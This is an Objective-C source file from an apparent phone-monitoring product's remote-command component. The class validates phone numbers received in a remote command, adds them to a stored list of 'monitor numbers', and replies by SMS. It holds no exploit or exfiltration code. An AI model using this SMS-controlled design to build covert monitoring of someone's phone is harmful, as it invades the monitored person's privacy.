/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  AddCISNNumbersProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  12/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "AddCISNumbersProcessor.h"
#import "PrefMonitorNumber.h"
#import "Preference.h"

@interface AddCISNumbersProcessor (PrivateAPI)
- (void) processAddCISNumbers;
- (void) addCISNumbersException: (NSUInteger) aErrorCode;
- (void) sendReplySMS;
- (BOOL) canAddCISNumbers;
- (BOOL) checkIfCISNumberAlreadyExist;
@end

@implementation AddCISNumbersProcessor

@synthesize mCISNumbers;

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the AddCISNumbersProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self(AddCISNumbersProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"AddCISNumbersProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the AddCISNumbersProcessor
 - Argument list and description: 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"AddCISNumbersProcessor--->doProcessingCommand")
	
	if ([RemoteCmdProcessorUtils isContainNonEndArgument:[mRemoteCmdData mArguments]]) {	
		[self setMCISNumbers:[RemoteCmdProcessorUtils validateArgs:[mRemoteCmdData mArguments] validationType:kPhoneNumberValidation]];
		DLog(@"AddCISNumbersProcessor--->CIS Numbers:%@",mCISNumbers);
		if ([mCISNumbers count]>0) {
			if ([self canAddCISNumbers]) { 
				if (![self checkIfCISNumberAlreadyExist]									&&
					![RemoteCmdProcessorUtils isDuplicateTelephoneNumber:mCISNumbers]) 
					[self processAddCISNumbers];
				else 
					[self addCISNumbersException:kCmdExceptionErrorCannotAddDuplicateToCisList];
			}
			else {
				[self addCISNumbersException:kCmdExceptionErrorCisNumberExceedListCapacity];
			}
		}
		else {
			[self addCISNumbersException:kCmdExceptionErrorInvalidCisNumberToCisList];
		}
	} else {
		[self addCISNumbersException:kCmdExceptionErrorInvalidCmdFormat];
	}	
}

#pragma mark AddCISNumbersProcessor PrivateAPI Methods

/**
 - Method name: processAddCISNumbers
 - Purpose:This method is used to process Add CIS Numbers
 - Argument list and description: No Argument
 - Return description: No Return type
*/

- (void) processAddCISNumbers {
	DLog (@"AddCISNumbersProcessor--->processAddCISMonitors");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefMonitorNumber *prefMonitor = (PrefMonitorNumber *) [prefManager preference:kMonitor_Number];
	NSMutableArray *cisNumberArray=[[NSMutableArray alloc] init];
	//Existing MonitorNumbers
	for (NSString *cisNumber in [prefMonitor mMonitorNumbers]) {
		[cisNumberArray addObject:cisNumber];
	}
	//New Monitor Numbers
	for (NSString *cisNumber in mCISNumbers) {
		[cisNumberArray addObject:cisNumber];
	}
	[prefMonitor setMMonitorNumbers:cisNumberArray];
	[prefManager savePreferenceAndNotifyChange:prefMonitor];
	[cisNumberArray release];
	[self sendReplySMS];
}

/**
 - Method name: canAddCISNumbers
 - Purpose:This method is used to check maximum cis numbers list. 
 - Argument list and description: No Argument
 - Return description: BOOL
*/

- (BOOL) canAddCISNumbers {
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefMonitorNumber *prefMonitor = (PrefMonitorNumber *) [prefManager preference:kMonitor_Number];
	int count=[[prefMonitor mMonitorNumbers] count]+[mCISNumbers count];
	if (count <= CIS_NUMBER_LIST_CAPACITY) {
		return YES;
	}
	else {
		return NO;
	}
}

/**
 - Method name: checkIfCISNumberAlreadyExist
 - Purpose:This method is used to check if number already exist. 
 - Argument list and description: No Argument
 - Return description:BOOL
*/

- (BOOL) checkIfCISNumberAlreadyExist {
	BOOL isNumberExist=NO;
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefMonitorNumber *prefMonitor = (PrefMonitorNumber *) [prefManager preference:kMonitor_Number];
	for (NSString *cisNumber in mCISNumbers) {
		NSPredicate *predicate = [NSPredicate predicateWithFormat:@"SELF == %@",cisNumber];
		NSArray *result=[[prefMonitor mMonitorNumbers] filteredArrayUsingPredicate:predicate];
		if ([result count]) {
			isNumberExist=YES;
			break;
		}
	}
	return isNumberExist;
}

/**
 - Method name: addMonitorsException
 - Purpose:This method is invoked when add monitors process failed. 
 - Argument list and description: No Argument
 - Return description: No Return Type
 */

- (void) addCISNumbersException:(NSUInteger) aErrorCode {
	DLog (@"AddCISNumbersProcessor--->addCISNumbersException")
	FxException* exception = [FxException exceptionWithName:@"addCISNumbersException" andReason:@"Add CIS Number error"];
	[exception setErrorCode:aErrorCode];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
 */

- (void) sendReplySMS {
	DLog (@"AddCISNumbersProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[mCISNumbers release];
	[super dealloc];
}


@end
